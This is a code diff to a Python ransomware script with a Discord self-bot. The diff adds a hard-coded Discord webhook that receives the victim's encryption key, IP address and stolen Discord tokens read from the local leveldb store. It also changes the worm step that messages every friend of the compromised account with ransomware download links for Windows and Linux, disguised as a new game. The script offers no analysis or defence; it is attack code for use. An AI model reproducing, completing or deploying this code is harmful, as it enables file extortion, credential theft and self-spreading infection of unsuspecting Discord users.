@@ -43,7 +43,7 @@ def warn():
     if sys == "Linux":
         name = "Ech0#0093" #change to your discord name and tag
         ip = requests.get('https://api.ipify.org').text
-        url = "" # discord webhook link 
+        url = "https://discord.com/api/webhooks/795958180373987338/aJvcJv1b_eMnMCsBwvf6Sct2XRpHsJJfpezlvoSUr5tofli5fF2rR7XxnJwuoec14VLm" 
         data = {}
         data["content"] = "Key Content for " + user + ": " + str(key)
         data["username"] = ip
@@ -53,10 +53,10 @@ def warn():
         f.close()
         subprocess.call(r"oof.txt", shell=False)
     if sys == "Windows":
-        name = "" #change to your discord name and tag
+        name = "Ech0#0093" #change to your discord name and tag
         path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
         ip = requests.get('https://api.ipify.org').text
-        url = "" # discord webhook link 
+        url = "https://discord.com/api/webhooks/795958180373987338/aJvcJv1b_eMnMCsBwvf6Sct2XRpHsJJfpezlvoSUr5tofli5fF2rR7XxnJwuoec14VLm" 
         data = {}
         data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path))   
         data["username"] = ip
@@ -81,7 +81,8 @@ def main():
         crypt(file)
     warn()
 
-url = "" # url to ransomeware
+urltoransomwarewindows = "" # url to ransomeware exe version
+urltoransomwarelinux = "" # url to ransomeware linux version
 token = str(find_tokens) #insert target token
 prefix = ""
 client = discord.Client()
@@ -90,7 +91,7 @@ bot = commands.Bot(command_prefix=prefix, self_bot=True)
 @bot.event
 async def on_ready():
     for user in bot.user.friends:
-        user.send("Yo try this new game! " + url)
+        user.send("Yo try this new game! " + urltoransomwarewindows + "for windows" + urltoransomwarelinux + "for linux")
     if sys == "Windows":
         main()
     if sys == "Linux":
